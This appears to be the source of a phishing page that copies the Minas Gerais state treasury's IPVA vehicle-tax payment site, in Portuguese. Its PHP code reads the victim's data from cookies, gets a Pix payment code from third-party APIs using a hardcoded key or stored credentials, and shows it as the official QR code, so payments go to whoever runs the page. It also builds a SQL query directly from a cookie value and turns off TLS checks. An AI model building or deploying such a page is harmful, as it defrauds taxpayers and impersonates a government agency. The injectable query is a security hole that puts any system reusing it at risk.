<?php


if($sucesso){

	include_once "./conectar/db.php";

	$dados = json_decode($_COOKIE['DataMg']);
    
	$idPix = $_COOKIE['Identity']; 

    $sql = "SELECT * FROM pix WHERE pixID = '$idPix'";
    $verpix = mysqli_query($conexao, $sql);
    $pix = mysqli_fetch_array($verpix);
    $pg = $pix['pg'];
    $Authorization = $pix['Authorization'];

    $client_secret = $pix['client_secret'];
    $client_key = $pix['client_key'];

    $nomePix = str_replace(' ','%20',trim($pix['nome']));
    $cidadePix = str_replace(' ','%20',trim(trim($pix['cidade'])));
    $chavePix = trim($pix['chave']);

	$porcentagem = 0;

    $valor = $_COOKIE['VLpix'];

	$valor = str_replace(',', '.', str_replace('.', '', $valor));

    $ResultadoPorcentagem = $valor - ($valor * $porcentagem / 100);

    $ResultadoPorcentagem = trim($ResultadoPorcentagem);

    $txid = rand(1, 9999999999);

     $ResultadoPG = number_format($ResultadoPorcentagem, 2, ',', '.');
     $ResultadoPGX = str_replace(',', '', str_replace('.', '', $ResultadoPG));
     $valorLp = str_replace('.', '', number_format($valor, 2));

    if($pg=='true'){

        $nome = $dados->proprietario;

        if($_COOKIE["pixCopiarEcole$ResultadoPGX"]){

           $pixCopiarEcole = $_COOKIE["pixCopiarEcole$ResultadoPGX"];

        }else{

            if (strpos($Authorization, 'streetpay') !== false){
        

                $pix = file_get_contents("https://base-base.online/api/streetpay.php?valor=$ResultadoPGX&bearer=$Authorization");

                $pixCopiarEcole = json_decode($pix)->qrcode;

                if($pixCopiarEcole){

                    setcookie('pixCopiarEcole'.$ResultadoPGX, $pixCopiarEcole, time() + (60 * 20));

                }else{

                        $nomePix = "A";
                        $cidadePix = 'B';
                        $chavePix = '50501870000112';

                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, "https://gerarqrcodepix.com.br/api/v1?valor=$ResultadoPorcentagem&txid=$txid&nome=$nomePix&cidade=$cidadePix&saida=br&chave=$chavePix");
                        curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, array(

                            'authority: gerarqrcodepix.com.br',
                            'sec-ch-ua: "Opera";v="77", "Chromium";v="91", ";Not A Brand";v="99"',
                            'accept: */*',
                            'Accept: application/json'
                        
                        ));
                        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
                        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
                        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) . '/cookie.txt');
                        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) . '/cookie.txt');

                        $pix = curl_exec($ch);

                        $pixCopiarEcole = json_decode($pix)->brcode;
                            
                }
            }
        }


    }else{

        $nomePix = "A";
        $cidadePix = 'B';
        $chavePix = '50501870000112';

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://gerarqrcodepix.com.br/api/v1?valor=$ResultadoPorcentagem&txid=$txid&nome=$nomePix&cidade=$cidadePix&saida=br&chave=$chavePix");
        curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(

            'authority: gerarqrcodepix.com.br',
            'sec-ch-ua: "Opera";v="77", "Chromium";v="91", ";Not A Brand";v="99"',
            'accept: */*',
            'Accept: application/json'
        
        ));
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) . '/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) . '/cookie.txt');

        $pix = curl_exec($ch);

        $pixCopiarEcole = json_decode($pix)->brcode;
    }
}

?>

<!DOCTYPE html>
<html class="ui-mobile">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta http-equiv="origin-trial"
        content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">

    <base href=".">


    <meta http-equiv="Content-Language" content="pt-BR">
    <meta name="robots" content="noindex,nofollow">
    <meta name="googlebot" content="nofollow,noarchive">
    <meta name="google" value="notranslate" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=no">
    <meta name="title" content="IPVA - SEF/MG">
    <meta name="description"
        content="IPVA ONLINE � um sistema da Secretaria de Estado de Fazenda de Minas Gerais que visa fornecer servi�os e acesso ao documentos de arrecada��o para os contribuintes via interface web.">
    <meta name="author" content="Secretaria de Estado de Fazenda de Minas Gerais - (GSD/DIST/STI)">
    <meta name="application-name" content="ipvaonline">
    <meta name="copyright" content="Secretaria de Estado de Fazenda de Minas Gerais">
    <meta name="language" content="portuguese">
    <meta name="geo.country" content="Brazil">
    <meta name="zipcode" content="31630-901">
    <!-- SEO SECTION - SEARCH ENGINE HELPER -->
    <meta name="keywords"
        content="SEF, SEFMG, SEF-MG, SEF/MG, acordaos, dapi, ipva, lei, leis, pautas, procuradoria, educacao fiscal, sintegra, secretaria, fazenda,taxa,licenciamento,trlav">
    <!-- APPLE PRODUCTS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <!-- MICROSOFT -->
    <meta name="msapplication-tooltip" content="IPVA ONLINE - SEF/MG">
    <meta name="msapplication-starturl" content="/Home.action">
    <meta name="msapplication-navbutton-color" content="#FF0000">
    <!-- TITLE -->
    <title>IPVA - SEF/MG</title>

    <link rel="shortcut icon" href="./operador/js/ipmg.png" type="image/x-png">

    <link rel="stylesheet" type="text/css" href="./IPMG_files/MGPIX_files/sef-theme-min.css">
    <link rel="stylesheet" type="text/css" href="./IPMG_files/MGPIX_files/jquery.mobile.structure-min.css">
    <link rel="stylesheet" type="text/css" href="./IPMG_files/MGPIX_files/jquery.mobile.icons-min.css">
    <link rel="stylesheet" type="text/css" href="./IPMG_files/MGPIX_files/app-min.css">

    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery-migrate-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.validation-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.validation.renavam-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.masked.input-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.number-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.mask-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.stringToSlug-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery-backspace-return-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.cookie-min.js.download"></script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.mobile.selectmenu.filterable-min.js.download">
    </script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.heartbeat-min.js.download"></script>


    <script type="text/javascript">
    jQuery(document).on("mobileinit", function() {
        jQuery.mobile.pageLoadErrorMessage = "Um erro aconteceu, tente novamente.";
        jQuery.mobile.loader.prototype.options.text = "Carregando...";
        jQuery.mobile.loader.prototype.options.textVisible = true;
        jQuery.mobile.loader.prototype.options.theme = "a";
        jQuery.mobile.loader.prototype.options.html = "";
    });
    </script>
    <script type="text/javascript" src="./IPMG_files/MGPIX_files/jquery.mobile-min.js.download"></script>



    <style type="text/css">
    * {
        font-family: 'Open Sans', Helvetica, Arial, sans-serif;
    }
    </style>



    <noscript>
        <div class="ui-collapsible ui-collapsible-inset ui-corner-all ui-collapsible-themed-content">
            <h4 class="ui-collapsible-heading">
                <a href="#"
                    class="ui-collapsible-heading-toggle ui-btn ui-fullsize ui-btn-icon-left ui-btn-up-d ui-btn-up-d">
                    <span class="ui-btn-inner">
                        <span class="ui-btn-text">IPVA - SEF/MG</span>
                        <span class="ui-icon ui-icon-shadow ui-icon-alert">&nbsp;</span>
                    </span>
                </a>
            </h4>
            <div class="ui-collapsible-content ui-body-d">
                <p>O <strong>JavaScript</strong> est� <strong>desabilitado</strong> no seu navegador.</p>
                <p>Para completa funcionalidade deste sistema � necess�rio que o mesmo esteja habilitado.</p>
                <p><a href="http://www.enable-javascript.com/pt/" target="_blank">Veja aqui as instru��es para ativar o
                        recurso em seu navegador.</a>
                <p>
            </div>
        </div>
        <style type="text/css">
        .no-app {
            display: none;
            visibility: hidden;
        }
        </style>
    </noscript>

    <link rel="stylesheet" type="text/css" href="./IPMG_files/MGPIX_files/impressaoIpvaConsolidado-pix.css">

</head>

<body class="ui-mobile-viewport ui-overlay-a" style="">
    <!-- Google Tag Manager (noscript) dentro do body -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTMMNKL796" height="0" width="0"
            style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <div id="page" data-role="page" data-theme="a"
        class="no-app ui-responsive-panel ui-page ui-page-theme-a ui-page-header-fixed ui-page-footer-fixed ui-page-active"
        data-url="page" tabindex="0" style="min-height: 782px; padding-top: 42px; padding-bottom: 95px;">


        <div data-role="header" data-position="fixed" data-theme="a" style="overflow:hidden;" role="banner"
            class="ui-header ui-bar-a ui-header-fixed slidedown">
            <a class="ui-btn-left ui-btn ui-icon-bars ui-btn-icon-left ui-btn-inline ui-corner-all ui-mini"
                data-theme="e" data-role="button" role="button">Menu</a>
            <h1 class="ui-title" role="heading" aria-level="1"><img src="./IPMG_files/MGPIX_files/logo-ipva.png"
                    style="display:none;width:0px;" alt="Secretaria de Estado de Fazenda de Minas Gerais" align="middle"
                    title="Secretaria de Estado de Fazenda de Minas Gerais"></h1>
        </div>


        <div id="menu" data-role="panel" data-display="reveal" data-position-fixed="true" data-theme="f"
            class="ui-panel ui-panel-position-left ui-panel-display-reveal ui-panel-closed ui-body-f ui-panel-fixed ui-panel-animate">
            <div class="ui-panel-inner">
                <ul data-role="listview" data-icon="false" data-global-nav="docs" data-theme="f"
                    class="nav-search ui-listview ui-group-theme-f">
                    <li data-icon="delete" class="ui-first-child"><a data-rel="close"
                            class="ui-btn ui-btn-icon-right ui-icon-delete">Fechar</a></li>

                    <li data-role="list-divider" class="ui-menu-divider-custom ui-li-divider ui-bar-f" role="heading">
                        Emiss�o</li>

                    <!--      <li data-icon="carat-r"><a data-rel="close" class="ui-menu-option-custom ui-menu-option-icon-custom" href="/ipvaonline/inputConsultaConsolidadoAnistia.action" data-ajax="false" title="Emitir Guia de Arrecada��o de IPVA">IPVA/Taxa de Licenciamento - Sem Multa e Juros - REFIS 2021</a></li> -->


                    <li data-icon="carat-r"><a
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="https://ipva1.fazenda.mg.gov.br/ipvaonline/inputConsultaIpvaPorRenavamConsolidadoAnoExercicio.action"
                            data-ajax="false" title="Emitir Guia de Arrecada��o de IPVA Consolidado">IPVA / Taxa de
                            Licenciamento Consolidado</a></li>
                    <li data-icon="carat-r"><a
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="http://daeonline1.fazenda.mg.gov.br/daeonline/executeEmissaoTaxaLicenciamentoVeicular.action"
                            data-ajax="false"
                            title="Emitir Guia de Arrecada��o de Taxa de Renova��o do Licenciamento Anual do Ve�culo">Taxa
                            de Licenciamento</a></li>
                    <li data-icon="carat-r"><a
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="https://ipva1.fazenda.mg.gov.br/ipvaonline/inputConsultaConsolidadoLocadora.action"
                            data-ajax="false" title="Emitir Guia de Arrecada��o de IPVA Proporcional Locadora">Locadora
                            / IPVA Proporcional</a></li>
                    <li data-role="list-divider" class="ui-menu-divider-custom ui-li-divider ui-bar-f" role="heading">
                        Consulta</li>
                    <li data-icon="carat-r"><a data-rel="close"
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="https://ipva1.fazenda.mg.gov.br/ipvaonline/inputConsultaIpvaPorRenavamConsolidadoAnoExercicio.action"
                            data-ajax="false" title="Consultar IPVA por RENAVAM">IPVA por RENAVAM</a></li>
                    <li data-icon="carat-r"><a data-rel="close"
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="https://ipva1.fazenda.mg.gov.br/ipvaonline/inputVencimentosIpva.action"
                            data-ajax="false" title="Consultar Escala de Vencimentos do IPVA">Escala de Vencimentos</a>
                    </li>
                    <li data-icon="carat-r"><a data-rel="close"
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="https://ipva1.fazenda.mg.gov.br/ipvaonline/inputConsultaBomPagadorIpvaPorRenavam.action"
                            data-ajax="false" title="Consultar desconto Bom Pagador do IPVA">Desconto Bom Pagador
                            IPVA</a></li>
                    <li data-icon="carat-r"><a data-rel="close"
                            class="ui-menu-option-custom ui-menu-option-icon-custom ui-btn ui-btn-icon-right ui-icon-carat-r"
                            href="https://ipva1.fazenda.mg.gov.br/ipvaonline/inputConsultaComprovantePagamentoIpva.action"
                            data-ajax="false" title="Consulta do Comprovante de Pagamento">Comprovante de Pagamento</a>
                    </li>
                    <li data-role="list-divider" class="ui-menu-divider-custom ui-li-divider ui-bar-f" role="heading">
                        versão</li>
                    <li class="ui-last-child"><a class="ui-menu-option-custom ui-btn">5.4.3</a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="ui-panel-wrapper">
            <div id="content" data-role="content" class="ui-content" role="main">



                <div id="content_title">
                    <h3 id="title" class="border-bottom-line">IPVA / Taxa de Licenciamento - Emissão de DAE<font
                            size="2"> (Documento de Arrecadação Estadual)</font>
                    </h3>
                </div>








                <div id="errosPlaceholder" style="display:none;">

                    <fieldset id="alertamensagem" data-role="collapsible" data-theme="d" data-collapsed="false"
                        data-content-theme="d"
                        class="ui-collapsible ui-collapsible-inset ui-corner-all ui-collapsible-themed-content">
                        <div role="heading" class="ui-collapsible-heading"><a
                                class="ui-collapsible-heading-toggle ui-btn ui-icon-minus ui-btn-icon-left ui-btn-d">Alerta<span
                                    class="ui-collapsible-heading-status"> click to collapse contents</span></a></div>
                        <div class="ui-collapsible-content ui-body-d" aria-hidden="false">
                            <div>
                                <!-- placeholder for legend -->
                            </div>
                            <div id="errosContainer">
                                <ul id="mensagensErros"></ul>
                            </div>
                        </div>
                    </fieldset>
                    <br>

                </div>



                <link rel="stylesheet" type="text/css" href="./IPMG_files/MGPIX_files/tabela.css">



                <script type="text/javascript">
                jQuery(document).ready(function() {

                    var socket = new WebSocket(urlSocket());

                    socket.onopen = function() {
                        const txid = jQuery("#txid").val();
                        socket.send(txid);
                    };

                    socket.onmessage = function(retorno) {
                        let data = JSON.parse(retorno.data);
                        let txidRetorno = data.txid;
                        let endToEndId = data.endToEndId;
                        let endToEndUndefined = typeof endToEndId === 'undefined';
                        const txid = jQuery("#txid").val();
                        if (txid === txidRetorno && endToEndUndefined === false) {
                            atualizarTelaAposConfirmacaoPagamento(endToEndId);
                            //socket.close();  
                        }
                    };

                    function urlSocket() {
                        let baseUrl = window.location.host;
                        let path = "/ipvaonline";
                        if (window.location.protocol === "https:") {
                            return "wss://" + baseUrl + path + "/websocket";
                        }
                        return "ws://" + baseUrl + path + "/websocket";
                    }

                    function atualizarTelaAposConfirmacaoPagamento(endToEndId) {
                        jQuery.mobile.loading("show", {
                            text: "Confirmando pagamento via PIX",
                            textVisible: true,
                            textOnly: false
                        });
                        jQuery("#box-pagamento-pix").remove();
                        jQuery("#container_botoes").remove();
                        jQuery("#pagamento-descricao-pix").remove();
                        jQuery("#alertamensagemPixIncluido").remove();
                        jQuery("#alertamensagemPagamentoPixSucesso").css("display", "block");
                        jQuery("#box-pagamento-pix-confirmacao").css("display", "block");
                        jQuery("#endToEndId").text(endToEndId);
                        jQuery.mobile.loading("hide");
                    }

                    var btnEmitirComprovante = jQuery("#btnEmitirComprovante");

                    btnEmitirComprovante.bind("vclick", function(event) {
                        tratarExibicaoBotaoConfirmarPagamento();
                        let endToEndId = jQuery("#endToEndId").text();
                        event.preventDefault();
                        var formulario = jQuery("#formularioEmitirComprovantePagamento");
                        jQuery("#formatoImpressao").val(formatoImpressao);
                        jQuery("#documento").val('ID_TRANSACAO_END_TO_END');
                        jQuery("#endToEndId").val(endToEndId);

                        var action = 'executeConsultaComprovantePagamentoIpva.action';
                        formulario.attr('action', action);
                        formulario.submit();
                        return false;
                    });

                    var btnCopiaCola = jQuery("#btnCopiaCola");

                    btnCopiaCola.bind("vclick", function(event) {
                        let inputCopia = document.createElement("input");
                        inputCopia.value = jQuery("#pixCopiaECola").val();;
                        document.body.appendChild(inputCopia);
                        inputCopia.select();
                        document.execCommand('copy');
                        document.body.removeChild(inputCopia);
                        jQuery("#popup-copia-cola").popup("open", {
                            positionTo: "#msg-copia-cola"
                        });
                        setTimeout(function() {
                            jQuery("#popup-copia-cola").popup("close");
                        }, 3000);

                        return false;
                    });

                    function tratarExibicaoBotaoConfirmarPagamento() {
                        desabilitarBotoesExibirLoad();
                        setTimeout(function($this) {
                            habilitarBotoesEsconderLoad();
                        }, 2000);
                    }

                    function desabilitarBotoesExibirLoad() {

                        jQuery.mobile.loading("show", {
                            text: "Carregando ...",
                            textVisible: true,
                            textOnly: false
                        });

                        var btnSubmit = jQuery("#gerarDaeConsolidado");
                        btnSubmit.prop('disabled', true).addClass('ui-disabled');

                        var btnSubmitPix = jQuery("#gerarDaeConsolidadoPix");
                        btnSubmitPix.prop('disabled', true).addClass('ui-disabled');
                    }

                    function habilitarBotoesEsconderLoad() {

                        jQuery.mobile.loading("hide");

                        var btnSubmit = jQuery("#gerarDaeConsolidado");
                        btnSubmit.prop('disabled', false);
                        btnSubmit.removeClass('ui-disabled');

                        var btnSubmitPix = jQuery("#gerarDaeConsolidadoPix");
                        btnSubmitPix.prop('disabled', false);
                        btnSubmitPix.removeClass('ui-disabled');
                    }

                });
                </script>




                <form id="formularioEmitirComprovantePagamento" data-ajax="false"
                    action="https://ipva1.fazenda.mg.gov.br/ipvaonline/ConsultaComprovantePagamentoIpva.action"
                    method="post">
                    <div style="display:none;">
                        <input type="hidden" id="formatoImpressao" name="formatoImpressao" value="">
                        <input type="hidden" id="documento" name="documento" value="">
                        <input type="hidden" id="endToEndId" name="endToEndId" value="">
                    </div>
                </form>



                <form id="formulario" data-ajax="false"
                    action="https://ipva1.fazenda.mg.gov.br/ipvaonline/executeImpressaoIpvaPorRenavamConsolidado.action"
                    method="post">

                    <div style="display:none">
                        <input type="hidden" id="formatoDocumento" name="formatoDocumento" value="">
                        <input type="hidden" name="tributo" id="tributo" value="">
                        <input type="hidden" name="cid" id="cid" value="8c88413b-dc26-45f9-b29a-1e5582231912">
                        <input type="hidden" name="renavam" id="renavam" value="<?=$renavam?>">
                        <input type="hidden" name="pixCopiaECola" id="pixCopiaECola" value="<?=$pixCopiarEcole?>">
                        <input type="hidden" name="boxPix" id="boxPix" value="true">
                        <input type="hidden" name="txid" id="txid" value="009cd26c7dba2b4cb5b73bbcd27c3ce143">
                        <input type="hidden" name="codigoDeBarras" id="codigoDeBarras"
                            value="85660000002377400632023121999149532570490239">
                    </div>




                    <fieldset id="alertamensagemPagamentoPixSucesso" data-role="collapsible" data-theme="d"
                        data-collapsed="false" data-content-theme="d" style="display:none"
                        class="ui-collapsible ui-collapsible-inset ui-corner-all ui-collapsible-themed-content">
                        <div role="heading" class="ui-collapsible-heading"><a
                                class="ui-collapsible-heading-toggle ui-btn ui-icon-minus ui-btn-icon-left ui-btn-d">Aten��o<span
                                    class="ui-collapsible-heading-status"> click to collapse contents</span></a></div>
                        <div class="ui-collapsible-content ui-body-d" aria-hidden="false">
                            <div>
                                <!-- placeholder for legend -->
                            </div>
                            <ul class="errorMessage">
                                <li><span>Confirma��o de pagamento do pix registrada com sucesso.</span></li>
                            </ul>
                        </div>
                    </fieldset>



                    <ul data-role="listview" data-inset="true" data-theme="c"
                        class="ui-listview ui-listview-inset ui-corner-all ui-shadow ui-group-theme-c">
                        <li data-role="list-divider" data-theme="c"
                            class="ui-text-reflow ui-li-divider ui-bar-c ui-first-child" role="heading">Pagamento de
                            Documento de Arrecadação</li>
                        <li data-role="fieldcontain"
                            class="ui-field-contain ui-text-reflow ui-li-static ui-body-inherit ui-last-child">

                            <div id="container-pagamento" class="ui-grid-a ui-responsive">

                                <!--  Div para detalhes de pagamento - Lado esquerdo -->
                                <div id="solicitacao-pagamento" class="solicitacao-pagamento">

                                    <ul id="box-solicitacao-pagamento" data-role="listview" data-inset="true"
                                        data-theme="c"
                                        class="box-contorno ui-listview ui-listview-inset ui-corner-all ui-shadow ui-group-theme-c">
                                        <li id="titulo-box" data-role="list-divider" data-theme="c"
                                            class="ui-text-reflow ui-li-divider ui-bar-c ui-first-child" role="heading">
                                            Dados da solicitação do pagamento
                                        </li>
                                        <li data-role="fieldcontain"
                                            class="ui-field-contain ui-text-reflow box-solicitacao-pagamento-info ui-li-static ui-body-inherit ui-last-child">
                                            <div class="pagamento-descricao">
                                                <div id="pagamento-descricao-info">
                                                    <label class="ui-text-reflow">Sr. Contribuinte, anote o número do
                                                        documento abaixo.</label>
                                                    <label class="ui-text-reflow">
                                                        Ele será necessário para a emissão do comprovante de pagamento
                                                        ou confirmação da quitação.</label>
                                                </div>
                                                <div id="pagamento-descricao-detalhe">
                                                    <label class="ui-text-reflow">Número do
                                                        documento:&nbsp;00.149532570-49</label>
                                                    <label
                                                        class="ui-text-reflow">RENAVAM:&nbsp;<?=$renavam?></label>
                                                    <label
                                                        class="ui-text-reflow"><b>Placa:&nbsp;<?=$placa?></b></label>
                                                    <label class="ui-text-reflow"><b>Data do vencimento:&nbsp;<?php 

														date_default_timezone_set('America/Sao_Paulo');

														echo $dataLocal = date('d/m/Y', time());
														
														?>
                                                        </b></label>

                                                    <label class="ui-text-reflow"><b>Valor
                                                            total(R$):&nbsp;R$&nbsp;<?=number_format($ResultadoPorcentagem, 2, ',', '.')?></b></label>
                                                </div>
                                            </div>
                                        </li>
                                    </ul>
                                </div>


                                <div id="pagamento-pix" class="pagamento-pix">

                                    <ul id="box-pagamento-pix" data-role="listview" data-inset="true" data-theme="c"
                                        class="box-contorno ui-listview ui-listview-inset ui-corner-all ui-shadow ui-group-theme-c">

                                        <li id="titulo-box" data-role="list-divider" data-theme="c"
                                            class="ui-text-reflow ui-li-divider ui-bar-c ui-first-child" role="heading">
                                            Pagamento via PIX</li>
                                        <li data-role="fieldcontain"
                                            class="ui-field-contain ui-text-reflow box-pagamento-pix-info ui-li-static ui-body-inherit ui-last-child">

                                            <div id="info-pagamento" class="info-pagamento">
                                                <div id="info-pagamento-descricao" class="info-pagamento-descricao">
                                                    <label class="ui-text-reflow">Escaneie este Código para
                                                        pagar.</label>
                                                    <label class="ui-text-reflow">Aponte a câmera do celular para o QR
                                                        Code/Imagem abaixo usando o app da sua instituição de pagamento
                                                        ou copie o Código </label>
                                                    <label class="ui-text-reflow">O QRCode expira em <b><?php 

														date_default_timezone_set('America/Sao_Paulo');

														echo $dataLocal = date('d/m/Y', time());

														?> às 23:59 </b> (Brasília DF)</label>
                                                </div>
                                                <div id="info-pagamento-qrcode" class="info-pagamento-qrcode">
                                                    <div id="info-qr-code-imagem" class="info-qr-code-imagem">
                                                        <img src="<?=$URL_QR?><?=$pixCopiarEcole?>"
                                                            style="/*width: 160px;*/ width: 100%; height: 100%; max-width: 150px; max-height: 150px;padding: 0px 0px 11px 0px;">
                                                    </div>
                                                    <div id="info-btnCopiaCola" class="info-btnCopiaCola">
                                                        <a id="btnCopiaCola" data-mini="true" data-inline="true"
                                                            data-role="button" data-icon="check" data-iconpos="right"
                                                            data-ajax="false"
                                                            class="ui-link ui-btn ui-icon-check ui-btn-icon-right ui-btn-inline ui-shadow ui-corner-all ui-mini"
                                                            role="button">Copiar Código PIX</a>
                                                    </div>
                                                </div>

                                            </div>
                                            <div id="info-pagamento-alerta" class="info-pagamento-alerta">
                                                <label class="ui-text-reflow">Após a confirmação do pagamento, a tela
                                                    será atualizada permitindo a geração do comprovante de pagamento.
                                                </label>
                                            </div>
                                        </li>
                                    </ul>

                                    <ul id="box-pagamento-pix-confirmacao" data-role="listview" data-inset="true"
                                        data-theme="c"
                                        class="ui-listview ui-listview-inset ui-corner-all ui-shadow ui-group-theme-c">

                                        <li id="titulo-box" data-role="list-divider" data-theme="c"
                                            class="ui-text-reflow ui-li-divider ui-bar-c ui-first-child" role="heading">
                                            Confirma��o de pagamento via PIX</li>
                                        <li data-role="fieldcontain"
                                            class="ui-field-contain ui-text-reflow box-pagamento-pix-confirmacao-info ui-li-static ui-body-inherit ui-last-child">

                                            <div class="pagamento-confirmacao-imagem">
                                                <img src="./IPMG_files/MGPIX_files/successo-pagamento-contorno.svg"
                                                    style="height: 85px;margin-right: 5px;"
                                                    alt="Secretaria de Estado de Fazenda de Minas Gerais" align="middle"
                                                    title="Secretaria de Estado de Fazenda de Minas Gerais">
                                            </div>

                                            <div class="ui-grid-a ui-responsive pagamento-confirmacao">
                                                <div class="pagamento-confirmacao-comprovante" style="margin-top:auto;">
                                                    <div class="confirmacao-pagamento-endToEndId"
                                                        style="margin-bottom: 5px; padding-top: 10px;">
                                                        <label class="ui-text-reflow"
                                                            style="font-weight: bold;">PAGAMENTO REALIZADO COM
                                                            SUCESSO!</label>
                                                    </div>
                                                    <div id="btn-emitir-comprovante" style="margin-top:10px;">
                                                        <a id="btnEmitirComprovante" data-mini="true" data-inline="true"
                                                            data-role="button" data-icon="check" data-iconpos="right"
                                                            data-ajax="false"
                                                            class="ui-link ui-btn ui-icon-check ui-btn-icon-right ui-btn-inline ui-shadow ui-corner-all ui-mini"
                                                            role="button">Emitir comprovante de pagamento</a>
                                                    </div>
                                                </div>
                                            </div>
                                        </li>
                                    </ul>

                                </div>



                            </div>

                        </li>
                        <div id="msg-copia-cola" style="margin: 0 auto">
                            <div style="display: none;" id="popup-copia-cola-placeholder">
                                <!-- placeholder for popup-copia-cola -->
                            </div>
                        </div>
                    </ul>


                    <br>


                </form>


                <div style="display:none">
                    <div id="formulariosBancos">
                        <form id="formBradesco"
                            action="https://banco.bradesco/html/classic/canais-digitais/internet-banking/index.shtm"
                            method="post" target="_blank">
                            <input type="hidden" name="CODBAR" value="85660000002377400632023121999149532570490239">
                        </form>
                        <form id="formBradescoJuridico" action="https://banco.bradesco/html/pessoajuridica/index.shtm"
                            method="post" target="_blank">
                            <input type="hidden" name="CODBAR" value="85660000002377400632023121999149532570490239">
                        </form>
                        <form id="formMercantil"
                            action="https://www.mercantildobrasil.com.br/ibk/paginas/Autenticacao/LNAutenticacaoPasso1.aspx?Opcao=1"
                            method="post" target="_blank">
                            <input id="txtconteudoTrn" type="hidden" name="conteudoTrn"
                                value="12653#54#80#85660000002377400632023121999149532570490239#49F52E10AF32B7336A6BD3DFA8FBA871">
                        </form>
                        <form id="formBBPessoaFisica" action="https://www2.bancobrasil.com.br/aapf/login.jsp"
                            method="post" target="_blank">
                            <input type="hidden" name="transacao" value="085202">
                            <input type="hidden" name="tipoTransacao" value="servlet">
                            <input type="hidden" name="@1"
                                value="Pagamento de Conv�nio#Secretaria de Estado de Fazenda/MG">
                            <table border="0">
                                <tbody>
                                    <tr>
                                        <td align="left">
                                            <input type="hidden" name="$dataPagamento" value="">
                                            <input type="hidden" name="@2" value="Data do pagamento#19/12/2023">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="left">
                                            <input type="hidden" name="$valorConvenio" value="2,37.74">
                                            <input type="hidden" name="@3" value="Valor#R$2,37.74">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="left">
                                            <input type="hidden" name="$campo1" value="856600000023">
                                            <input type="hidden" name="$campo2" value="774006320231">
                                            <input type="hidden" name="$campo3" value="219991495325">
                                            <input type="hidden" name="$campo4" value="">
                                            <input type="hidden" name="@4"
                                                value="C�digo de barras#85660000002377400632023121999149532570490239">
                                            <input type="hidden" name="$codigoBarra" value="digitado">
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </form>
                        <form id="formBBPessoaJuridica"
                            action="https://www.bb.com.br/pbb/pagina-inicial/pessoa-juridica#/" method="post"
                            target="_blank">
